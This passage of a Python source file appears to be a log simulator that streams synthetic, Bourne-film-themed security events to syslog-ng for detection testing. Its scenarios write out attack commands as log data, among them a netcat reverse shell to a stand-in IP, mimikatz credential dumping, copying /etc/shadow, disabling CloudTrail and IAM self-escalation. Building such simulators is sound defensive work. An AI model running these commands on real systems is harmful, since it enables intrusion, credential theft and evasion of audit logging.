        _win_line("BLACKBRIAR-DB01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 10, "LogonTypeName": "RemoteInteractive", "TargetUserName": "noah.vosen",
                  "TargetDomainName": "CIA", "IpAddress": ip}),
        _db_line("noah.vosen", "public.asset_roster", "SELECT", "READ",
                 "SELECT * FROM asset_roster", 1847),
        _db_line("noah.vosen", "public.cover_identities", "SELECT", "READ",
                 "SELECT alias,passport FROM cover_identities", 612),
        _dns_line("langley-dc01.cia.gov", "10.0.2.20", "exfil-relay.example.com", "A", sev=4),
        _proxy_line("ops-dmz-gw01.cia.gov", "10.0.2.20", "TCP_TUNNEL", 200, 6022144, "CONNECT",
                    "exfil-relay.example.com:443", "noah.vosen", "HIER_DIRECT/37.120.198.211", "-"),
    ])

def sc_lateral_langley():
    """LATERAL — password spray, success, then mimikatz on a Langley host."""
    ip = "192.0.2.145"
    lines = [_win_line("LANGLEY-DC01", {"EventID": 4625, "Event": "An account failed to log on",
             "LogonType": 3, "TargetUserName": u, "TargetDomainName": "CIA", "Status": "0xC000006D",
             "SubStatus": "0xC000006A", "IpAddress": ip}, sev=4)
             for u in ("p.landy", "n.vosen", "e.kramer")]
    lines += [
        _win_line("LANGLEY-DC01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 3, "LogonTypeName": "Network", "TargetUserName": "ezra.kramer",
                  "TargetDomainName": "CIA", "IpAddress": ip}),
        _win_line("IRONHAND-CTRL01", {"EventID": 4688, "Event": "A new process has been created",
                  "NewProcessName": "C:\\Windows\\Temp\\mimikatz.exe", "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
                  "ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "SubjectUserName": "ezra.kramer"}, sev=4),
        _win_line("IRONHAND-CTRL01", {"EventID": 4672, "Event": "Special privileges assigned to new logon",
                  "SubjectUserName": "ezra.kramer", "PrivilegeList": "SeDebugPrivilege, SeTcbPrivilege"}),
    ]
    return ("Lateral movement — password spray → mimikatz at Langley", lines)

def sc_amsterdam_deaddrop():
    """IDENTITY-ERA CRAFT — a canal-district dead drop with hostile contact Kirilenko."""
    ip, host = "83.245.10.55", "safehouse-amsterdam-01.cia.gov"
    return ("Amsterdam — canal-district dead drop (Kirilenko)", [
        _dns_line(host, "10.6.5.100", "deaddrop-amsterdam.example.net", "A", sev=4),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.6.5.100"),
        _duo_line("duo-authproxy02.cia.gov", "o.kirilenko", "HOSTILE", "Asset Tracker (CLASSIFIED)", ip, "fraud", "user_marked_fraud"),
        _ssh_line(host, "Accepted publickey for frank.meyer from "+ip+" port 50142 ssh2: RSA SHA256:"+_fake_sha256()),
        _proxy_line(host, "10.6.5.100", "TCP_TUNNEL", 200, 33221, "CONNECT", "deaddrop-amsterdam.example.net:443", "frank.meyer", "HIER_DIRECT/"+ip, "-"),
    ])

def sc_vienna_rendezvous():
    """ULTIMATUM-STYLE CRAFT — a Vienna asset meeting under surveillance; Szabo is hostile."""
    ip, host = "194.9.108.22", "station-vienna-01.cia.gov"
    return ("Vienna — Szabo rendezvous under surveillance", [
        _duo_line("duo-authproxy01.cia.gov", "t.stack", "BLACKBRIAR", "Vienna Consulate VPN", ip, "success", "user_approved"),
        _http_line(host, ip, "tom.stack", "GET", "/intel/db/search?q=szabo+viktor", 200, 8811),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.7.5.100"),
        _duo_line("duo-authproxy01.cia.gov", "v.szabo", "HOSTILE", "Asset Tracker (CLASSIFIED)", ip, "fraud", "user_marked_fraud"),
        _ssh_line(host, "Failed password for invalid user v.szabo from "+ip+" port 50877 ssh2", sev=4),
    ])

def sc_rome_extraction_blown():
    """ULTIMATUM-STYLE CRAFT — the Rome extraction team is blown; station burns the op."""
    ip, host = "151.38.22.10", "station-rome-01.cia.gov"
    lines = [_duo_line("duo-authproxy02.cia.gov", n, "BLACKBRIAR", "Embassy RDP Gateway", ip, "denied", "no_response")
             for n in ("s.okonkwo", "t.cronin")]
    lines += [
        _panw_traffic_line(host, ip, "10.6.0.1", 443, "ssl", action="deny", sev=4),
        _sudo_line(host, "sarah.okonkwo", "/opt/blackbriar/bin/burn_program.sh --op ROME-EXTRACT --reason COMPROMISED"),
        _win_line("OUTCOME-WS04", {"EventID": 4740, "Event": "A user account was locked out",
                  "TargetUserName": "s.okonkwo", "CallerComputerName": "STATION-ROME-01"}, sev=4),
    ]
    return ("Rome — extraction team compromised, station burns the op", lines)

def sc_copenhagen_sigint():
    """SIGINT — a Copenhagen satellite intercept run, flagged by an analyst."""
    ip, host = "195.184.104.13", "station-copenhagen-01.cia.gov"
    return ("Copenhagen — satellite intercept run", [
        _duo_line("duo-authproxy01.cia.gov", "p.nair", "BLACKBRIAR", "Outcome SIGINT Console", ip, "success", "valid_passcode", factor="passcode"),
        _sudo_line(host, "priya.nair", "/opt/blackbriar/bin/satphone_intercept.py --grid copenhagen"),
        _dns_line(host, "10.8.5.100", "sigint-cache.example.net", "A", sev=4),
        _http_line(host, ip, "priya.nair", "GET", "/api/v2/sigint/intercepts", 200, 55210),
        _audit_line(host, ip, "10.8.5.100", 443),
    ])

def sc_langley_insider_leak():
    """INSIDER THREAT — scapegoated station chief Kublinski leaks files before the fall."""
    ip = "192.168.10.15"
    return ("Langley — Kublinski insider leak (insider threat)", [
        _win_line("LANGLEY-DC01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 2, "LogonTypeName": "Interactive", "TargetUserName": "jack.kublinski",
                  "TargetDomainName": "CIA", "IpAddress": ip}),
        _db_line("jack.kublinski", "public.cover_identities", "SELECT", "READ",
                 "SELECT alias,passport FROM cover_identities", 1204),
        _email_line(_mimecast_event(recipient="jack.kublinski@cia.gov", sender_name="Jack Kublinski",
                    sender="j.kublinski@cia-gov.example.org", subject="Blackbriar — your source is exposed",
                    direction="outbound", event_type="TTP Impersonation Protection",
                    malicious=True, blocked=False)),
        _sudo_line("langley-annex02.cia.gov", "jack.kublinski", "/bin/cp /etc/shadow /tmp/.hidden_s"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["insider"], "10.0.0.1", "172.16.0.1"),
    ])

def sc_ny_treadstone_induction():
    """TREADSTONE ORIGIN — Dr. Hirsch runs a behavioral-mod induction session, NYC lab."""
    host = "treadstone-nyc-lab01.cia.gov"
    return ("New York — Treadstone behavioral-mod induction (NYC lab)", [
        _win_line("TREADSTONE-NYC-LAB01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 2, "LogonTypeName": "Interactive", "TargetUserName": "albert.hirsch",
                  "TargetDomainName": "CIA", "IpAddress": "10.0.1.11"}),
        _duo_line("duo-authproxy02.cia.gov", "a.hirsch", "TREADSTONE", "Treadstone Behavioral-Mod Console", "10.0.1.11", "success", "user_approved"),
        _sudo_line(host, "albert.hirsch", "/opt/treadstone/bin/behavior_mod.py --subject david.webb --session induction"),
        _http_line(host, "10.0.1.11", "albert.hirsch", "POST", "/comsec/keygen", 201, 2044),
        _panw_vpn_line("langley-fw01.cia.gov", "a.hirsch", "10.0.1.11"),
    ])

def sc_deepdream_cyberops():
    """JASON BOURNE (2016) — Craig Jeffers runs a Deep Dream social-scrape cyber op."""
    ip, host = "64.124.201.9", "station-vegas-01.cia.gov"
    return ("Las Vegas — Deep Dream cyber ops (Craig Jeffers)", [
        _duo_line("duo-authproxy01.cia.gov", "c.jeffers", "DEEPDREAM", "Deep Dream Cyber Ops Console", ip, "success", "user_approved"),
        _sudo_line(host, "craig.jeffers", "/opt/ironhand/bin/social_scrape.py --src deepdream"),
        _http_line(host, ip, "craig.jeffers", "GET", "/deepdream/admin/users/export", 200, 992144, ua="DeepDreamBackdoor/0.9 (do-not-log)"),
        _proxy_line(host, "10.5.0.1", "TCP_MISS", 200, 1822044, "POST", "https://api.deepdream.example.com/v1/users/export", "craig.jeffers", "HIER_DIRECT/"+ip, "application/json"),
    ])

def sc_larx_handoff():
    """LEGACY — an Outcome/LARX field-comms handoff routed through New Delhi."""
    ip, host = "103.27.9.44", "station-newdelhi-01.cia.gov"
    return ("New Delhi — Outcome/LARX field-comms handoff", [
        _duo_line("duo-authproxy02.cia.gov", "number.four", "OUTCOME", "LARX Field Comms", ip, "success", "valid_passcode", factor="passcode"),
        _ssh_line(host, "Accepted publickey for outcome.no5 from "+ip+" port 49221 ssh2: RSA SHA256:"+_fake_sha256()),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.9.5.100"),
        _sudo_line("larx-ctrl01.cia.gov", "mark.turso", "/bin/bash /opt/larx/rotate_creds.sh"),
        _http_line(host, ip, "outcome.no4", "GET", "/ops/larx/targets", 200, 11290),
    ])

def sc_east_berlin_origin():
    """TREADSTONE (2019) — Becker pulls Bentley's declassified East Berlin origin file."""
    ip, host = "195.62.13.45", "embassy-berlin-fw01.cia.gov"
    return ("East Berlin — Becker pulls Bentley's Treadstone origin file", [
        _duo_line("duo-authproxy01.cia.gov", "e.becker", "BLACKBRIAR", "East Berlin Archive Access", "10.0.1.10", "success", "user_approved"),
        _http_line("blackbriar-db01.cia.gov", "10.0.1.10", "ellen.becker", "GET", "/intel/db/search?q=bentley+randolph", 200, 51204),
        _db_line("ellen.becker", "public.cover_identities", "SELECT", "READ",
                 "SELECT * FROM cover_identities WHERE alias='j.r.bentley'", 3),
        _ssh_line(host, "Accepted publickey for randolph.bentley from "+ip+" port 49882 ssh2: RSA SHA256:"+_fake_sha256()),
        _panw_vpn_line("langley-fw01.cia.gov", "j.r.bentley", ip),
    ])

def sc_mckenna_awakening():
    """TREADSTONE (2019) — Doug McKenna's sleeper trigger fires in Tulsa, OK."""
    ip, host = "173.245.10.88", "outpost-tulsa-ok.cia.gov"
    return ("Tulsa, OK — Doug McKenna's Treadstone sleeper activation", [
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["sleeper"], ip, "10.12.5.100"),
        _duo_line("duo-authproxy02.cia.gov", "d.mckenna", "TREADSTONE", "Treadstone Sleeper Activation Portal", ip, "success", "user_approved"),
        _win_line("OUTCOME-WS04", {"EventID": 4672, "Event": "Special privileges assigned to new logon",
                  "SubjectUserName": "doug.mckenna", "PrivilegeList": "SeDebugPrivilege, SeTcbPrivilege"}),
        _sudo_line(host, "doug.mckenna", "/opt/treadstone/bin/behavior_mod.py --subject doug.mckenna --session activation"),
        _proxy_line(host, "10.12.5.100", "TCP_TUNNEL", 200, 14022, "CONNECT", "beacon.treadstone.example.net:443", "doug.mckenna", "HIER_DIRECT/"+ip, "-"),
    ])

def sc_seoul_pak_awakening():
    """TREADSTONE (2019) — SoYun Pak's sleeper trigger fires near Seoul; Coleman/Edwards monitor."""
    ip, host = "121.78.55.12", "station-seoul-01.cia.gov"
    return ("Seoul — SoYun Pak's Treadstone sleeper activation", [
        _dns_line(host, "10.11.5.100", "beacon.treadstone.example.net", "TXT", sev=4),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["sleeper"], ip, "10.11.5.100"),
        _duo_line("duo-authproxy01.cia.gov", "t.coleman", "BLACKBRIAR", "Treadstone Sleeper Activation Portal", "10.0.1.10", "success", "user_approved"),
        _http_line(host, "10.11.5.100", "matt.edwards", "GET", "/intel/db/search?q=pak+soyun", 200, 9021),
        _ssh_line(host, "Accepted publickey for soyun.pak from "+ip+" port 51023 ssh2: RSA SHA256:"+_fake_sha256()),
    ])

def sc_petra_handler_betrayal():
    """TREADSTONE (2019) — rogue handler Petra issues a kill order on an awakened asset."""
    ip = "160.153.0.12"
    return ("Petra — rogue handler issues a kill order on McKenna", [
        _duo_line("duo-authproxy02.cia.gov", "p.hollander", "HOSTILE", "Asset Tracker (CLASSIFIED)", ip, "fraud", "user_marked_fraud"),
        _sudo_line("blackbriar-db01.cia.gov", "petra", "/opt/blackbriar/bin/authorize_kill.py --target doug.mckenna --asset ASSET-MCKENNA"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["c2"], ip, "10.12.5.100"),
        _ssh_line("outpost-tulsa-ok.cia.gov", "Failed password for invalid user petra from "+ip+" port 52341 ssh2", sev=4),
    ])

def sc_aws_privesc_kublinski():
    """AWS PRIVILEGE ESCALATION — Kublinski's insider access attaches AdministratorAccess to himself."""
    program = "BLACKBRIAR"
    op = next(o for o in OPERATIVES if o["name"] == "jack.kublinski")
    login = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com",
                               response_elements={"ConsoleLogin": "Success"})
    attach = _cloudtrail_event(op, program, "AttachUserPolicy", "iam.amazonaws.com", read_only=False,
                                request_params={"userName": "jack.kublinski",
                                                 "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"})
    put_role = _cloudtrail_event(op, program, "PutRolePolicy", "iam.amazonaws.com", read_only=False,
                                  request_params={"roleName": AWS_ROLES[program], "policyName": "self-escalate",
                                                   "policyDocument": "{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}"})
    return ("AWS privilege escalation — Kublinski attaches AdministratorAccess to himself", [
        _cloudtrail_line(login),
        _duo_line("duo-authproxy02.cia.gov", "j.kublinski", "BLACKBRIAR", "Insider Threat Review Portal", "192.168.10.15", "success", "user_approved"),
        _cloudtrail_line(attach, sev=2),
        _cloudtrail_line(put_role, sev=2),
    ])

def sc_aws_defense_evasion_petra():
    """AWS DEFENSE EVASION — Petra disables org CloudTrail logging from a compromised session."""
    program = "BLACKBRIAR"
    op = next(o for o in OPERATIVES if o["name"] == "petra")
    ip = "160.153.0.12"  # Beirut -- her known egress, already tied to her in sc_petra_handler_betrayal
    login = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com", mfa=False, source_ip=ip,
                               response_elements={"ConsoleLogin": "Success"})
    stop_logging = _cloudtrail_event(op, program, "StopLogging", "cloudtrail.amazonaws.com", read_only=False,
                                      mfa=False, source_ip=ip, request_params={"name": "org-cloudtrail"})
    root_action = _cloudtrail_event(op, program, "DeleteTrail", "cloudtrail.amazonaws.com", read_only=False,
                                     mfa=False, source_ip=ip, root=True, request_params={"name": "org-cloudtrail"})
    return ("AWS defense evasion — Petra disables org CloudTrail logging", [
        _cloudtrail_line(login, sev=4),
        _cloudtrail_line(stop_logging, sev=1),
        _cloudtrail_line(root_action, sev=1),
        _sudo_line("blackbriar-db01.cia.gov", "petra", "/usr/bin/openssl s_client -connect langley.cia.gov:443"),
    ])

def sc_edr_reverse_shell_petra():
    """EDR — Petra drops a netcat reverse shell on McKenna's Tulsa host (companion to sc_petra_handler_betrayal)."""
    endpoint = "outpost-tulsa-ok.cia.gov"
    ip = "160.153.0.12"  # Beirut -- her known egress
    shell = _proc("bash", "-bash", user="doug.mckenna")
    nc_proc = _proc("nc", f"nc -e /bin/bash {ip} 4444", user="doug.mckenna", parent=shell)
    proc_event = _edr_event("Process Creation", endpoint, tgt_process=nc_proc)
    net_event = _edr_event("IP Connect", endpoint, category="Network", src_process=nc_proc,
                            src_ip="10.12.5.100", src_port=51221, dst_ip=ip, dst_port=4444,
                            net_direction="OUTGOING")
    return ("EDR — Petra drops a netcat reverse shell on McKenna's host", [
        _edr_line(proc_event, sev=2),
        _edr_line(net_event, sev=2),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["c2"], ip, "10.12.5.100"),
    ])

def sc_edr_mimikatz_langley():
    """EDR — mimikatz credential dumping on IRONHAND-CTRL01 (companion to sc_lateral_langley)."""
    endpoint = "IRONHAND-CTRL01"
    cmd = _proc("cmd.exe", "cmd.exe /c mimikatz.exe", user="ezra.kramer")
    mimikatz = _proc("mimikatz.exe", "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
                      display_name="mimikatz.exe", user="ezra.kramer", parent=cmd)
    proc_event = _edr_event("Process Creation", endpoint, tgt_process=mimikatz)
    indicator_event = _edr_event("Behavioral Indicators", endpoint, category="Indicator", src_process=mimikatz,
                                  indicator={"name": "Credential Access via Mimikatz", "category": "Credential Access",
                                             "description": "Process accessed LSASS memory to harvest credentials",
                                             "tactics": "Credential Access", "techniques": "T1003.001"})
    return ("EDR — mimikatz credential dumping on IRONHAND-CTRL01", [
        _edr_line(proc_event, sev=2),
        _edr_line(indicator_event, sev=1),
    ])

def sc_edr_task_persistence_mckenna():
    """EDR — scheduled-task persistence registered during McKenna's Treadstone activation."""
    endpoint = "TREADSTONE-NYC-LAB01"
    proc = _proc("schtasks.exe", "schtasks.exe /create /tn TreadstoneSync /tr behavior_mod.py /sc onlogon",
                 user="doug.mckenna")
    event = _edr_event("Task Register", endpoint, category="Task", src_process=proc,
                        task_path="\\Microsoft\\Windows\\TreadstoneSync")
    return ("EDR — scheduled-task persistence during McKenna's activation", [
        _edr_line(event, sev=3),
    ])

def sc_edr_dns_exfil_neski():
    """EDR — DNS resolution to the exfil relay during Neski files exfiltration (companion to sc_dns_tunnel_exfil)."""
    endpoint = "blackbriar-db01.cia.gov"
    proc = _proc("bash", "-bash", user="ward.abbott")
    event = _edr_event("DNS Resolved", endpoint, category="Network", src_process=proc,
                        dns_request="exfil-relay.example.com")
    return ("EDR — DNS resolution to exfil-relay during Neski files exfiltration", [
        _edr_line(event, sev=3),
    ])

SCENARIOS: list[Callable[[], tuple]] = [
    sc_zurich_bank, sc_paris_safehouse, sc_berlin_neski, sc_goa_kirill,
    sc_waterloo_ross, sc_madrid_daniels, sc_tangier_desh, sc_manila_outcome,
    sc_reykjavik_hack, sc_vegas_dewey, sc_athens_riots,
    sc_phish_landy, sc_dns_beacon, sc_dns_tunnel_exfil, sc_kerberoast,
    sc_db_mass_extract, sc_lateral_langley,
    sc_amsterdam_deaddrop, sc_vienna_rendezvous, sc_rome_extraction_blown,
    sc_copenhagen_sigint, sc_langley_insider_leak, sc_ny_treadstone_induction,
    sc_deepdream_cyberops, sc_larx_handoff,
    sc_east_berlin_origin, sc_mckenna_awakening, sc_seoul_pak_awakening,
    sc_petra_handler_betrayal,
    sc_aws_privesc_kublinski, sc_aws_defense_evasion_petra,
    sc_edr_reverse_shell_petra, sc_edr_mimikatz_langley,
    sc_edr_task_persistence_mckenna, sc_edr_dns_exfil_neski,
]

# ─── Generator registry ────────────────────────────────────────────────────────

GENERATORS: list[tuple[int, Callable[[], str]]] = [
    # (weight, generator_fn)
    (35, gen_panw_traffic),
    (15, gen_panw_deny),
    (10, gen_panw_globalprotect),
    (5,  gen_panw_threat),
    (10, gen_ssh_auth),
    (5,  gen_sudo_event),
    (5,  gen_pam_session),
    (5,  gen_apache_access),
    (3,  gen_cron_job),
    (2,  gen_kernel_audit),
    (10, gen_duo_auth),
    (3,  gen_duo_admin),
    (10, gen_web_proxy),
    (12, gen_dns_query),
    (4,  gen_email_threat),
    (6,  gen_db_audit),
    (10, gen_win_event),
    (12, gen_cloudtrail_event),
    (15, gen_s1_edr_event),
]

POPULATION = [fn for weight, fn in GENERATORS for _ in range(weight)]

# ─── TCP sender ───────────────────────────────────────────────────────────────

def send_logs(sock: socket.socket) -> int:
    """Emit one burst. Occasionally fires a correlated Bourne scenario instead.
    Returns the number of events sent."""
    if SCENARIOS and random.random() < SCENARIO_CHANCE:
        title, lines = random.choice(SCENARIOS)()
        log.info(f"[SCENARIO] {title} — {len(lines)} correlated events")
        for line in lines:
            if line is not None:  # EDR lines are ingested directly into SDL, nothing to send here
                sock.sendall(line.encode("utf-8"))
        return len(lines)

    for _ in range(BURST_SIZE):
        line = random.choice(POPULATION)()
        if line is not None:
            sock.sendall(line.encode("utf-8"))
    return BURST_SIZE

def connect() -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SYSLOG_HOST, SYSLOG_PORT))
    log.info(f"Connected to syslog-ng at {SYSLOG_HOST}:{SYSLOG_PORT}")
    return s

# ─── Main loop ────────────────────────────────────────────────────────────────

def main() -> None:
    log.info(
        f"Treadstone Log Simulator starting — "
        f"target={SYSLOG_HOST}:{SYSLOG_PORT} "
        f"burst={BURST_SIZE} interval={INTERVAL_MS}ms"
    )
    interval = INTERVAL_MS / 1000.0
    sock = None
    total = 0

    while True:
        try:
            if sock is None:
                sock = connect()

            sent = send_logs(sock)
            prev = total
            total += sent
            if total // 100 != prev // 100:
                log.info(f"[TREADSTONE-SIM] {total} log events emitted")

        except (ConnectionRefusedError, OSError, BrokenPipeError) as exc:
            log.warning(f"Connection error: {exc} — retrying in 5s")
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
            sock = None
            time.sleep(5)
            continue

        time.sleep(interval)

if __name__ == "__main__":
    main()
